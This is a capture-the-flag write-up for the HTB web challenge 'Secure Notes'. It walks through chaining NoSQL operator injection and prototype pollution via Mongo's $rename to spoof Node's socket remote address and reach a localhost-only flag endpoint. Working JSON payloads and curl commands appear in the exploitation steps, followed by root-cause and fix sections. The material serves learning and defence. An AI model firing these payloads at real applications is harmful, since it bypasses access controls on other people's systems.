# Secure Notes — HTB Web (Easy)

**Category:** Web Exploitation
**Stack:** Node.js / Express / Mongoose / MongoDB 7.0 (single container via `supervisord`)

## Challenge Description

> We built this note-taking app to be so simple, there can't possibly be any bugs. We even added a door to claim the flag. However, only those who knock from inside may enter!

## Overview

A minimal note-taking API with three routes plus a flag endpoint:

```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});

app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

`/flag` trusts `req.connection.remoteAddress` — the raw socket peer address, not `req.ip`. This matters: `X-Forwarded-For` and `Host` header spoofing have zero effect on this check, since `trust proxy` only ever influences `req.ip`. The check is otherwise sound against remote spoofing, confirmed by testing.

## Vulnerability 1 — NoSQL operator injection (`/update`)

`noteId` is read straight from the JSON body with **no type or shape validation** and reused as the literal value of the `_id` field in two separate Mongoose calls. Because it comes from a JSON body (not a route param), it can be an **object**, not just a string.

Sending:

```json
{"noteId": {"$ne": null}, "title": "test", "content": "test"}
```

bypasses exact `_id` matching entirely — `findByIdAndUpdate`/`find` now match *any* document whose `_id` is not null, rather than a specific note. Confirmed with a 200 response and the note returned despite an invalid/arbitrary ID.

This alone is a broken-access-control bug (arbitrary note read/update), but doesn't reach `/flag`.

## Vulnerability 2 — Prototype pollution via `$rename`

The real chain: `findByIdAndUpdate(noteId, req.body)` passes the **entire raw request body** as the MongoDB update document, with no field whitelisting. This lets an attacker use real Mongo update operators directly — including `$rename`.

Mongoose's internal handling of nested update paths walks the target object segment by segment. Because `__proto__` is not filtered out as a special segment, walking a path like `__proto__._peername.address` ends up mutating the actual, shared `Object.prototype` — polluting every object in the running Node process, not just the target document.

## Chaining to the flag

Node's `net.Socket.remoteAddress` getter is a **lazily-cached own property**:

```js
Socket.prototype._getpeername = function() {
  if (!this._peername) {
    // ...fetch real peer info via the OS handle, cache it as this._peername
  }
  return this._peername;
};
```

On the *first* access of `remoteAddress` for a given connection, `this._peername` doesn't exist yet as an own property — so the lookup falls through the prototype chain. If `Object.prototype._peername` has been polluted with `{ address: '127.0.0.1' }`, the truthy check `if (!this._peername)` is satisfied by the inherited value, the real OS-level lookup is skipped entirely, and the poisoned address is returned instead of the true remote peer.

### Steps

1. Create a note (any content):
   ```bash
   curl -s -X POST http://TARGET:PORT/create \
     -H "Content-Type: application/json" \
     -d '{"title":"x","content":"y"}'
   ```

2. Pollute `Object.prototype._peername.address` via `$rename` on `/update`:
   ```bash
   curl -s -X POST http://TARGET:PORT/update \
     -H "Content-Type: application/json" \
     -d '{"noteId": "<real-note-id>", "$rename": {"title": "__proto__._peername.address"}}'
   ```
   (Note's `title` was set to `127.0.0.1` beforehand, so renaming it onto the polluted path plants that value.)

3. Trigger a fresh request to `/flag` — a new/previously-unaccessed socket will read the polluted `_peername.address` on first access:
   ```bash
   curl -s http://TARGET:PORT/flag
   ```
   → `HTB{...}`

## Root cause

- No input validation on `/update`'s body — any field, including full Mongo operators, reaches the database layer unfiltered.
- No `__proto__`/`constructor`/`prototype` key filtering during nested-path updates (classic JS prototype-pollution gadget).
- A security-relevant trust decision (`remoteAddress`) sourced from a mutable, globally-shared JS object (`Object.prototype`) instead of a value obtained fresh from the OS/socket each time.

## Fix

- Validate/whitelist `noteId` (must be a valid ObjectId string) and the updatable fields (`title`, `content` only) before touching Mongoose.
- Never pass raw `req.body` as a Mongo update document — build an explicit `$set` with known fields.
- Block `__proto__`, `constructor`, `prototype` as path segments in any code that does manual nested-object writes (or use a library that already does).

---

## Pattern-library entry

### 2026-09-14 — HTB Secure Notes (Easy, Web)

- **Fingerprint:** an update/PATCH-style route that passes the *entire* request body as a database update object with no field whitelist — instant candidate for operator injection *and* prototype pollution, not just IDOR.
- **Mechanism:** unsanitized `$rename`-style nested path writes can reach `__proto__`, polluting `Object.prototype` process-wide; some Node internals (like `Socket.remoteAddress`) lazily cache values as own properties and silently fall back to a polluted prototype value on first access.
- **Needed writeup?** Yes — didn't know the `Socket._peername` lazy-cache internal, and hadn't previously connected "NoSQL operator injection" to "prototype pollution" as a chainable pair.
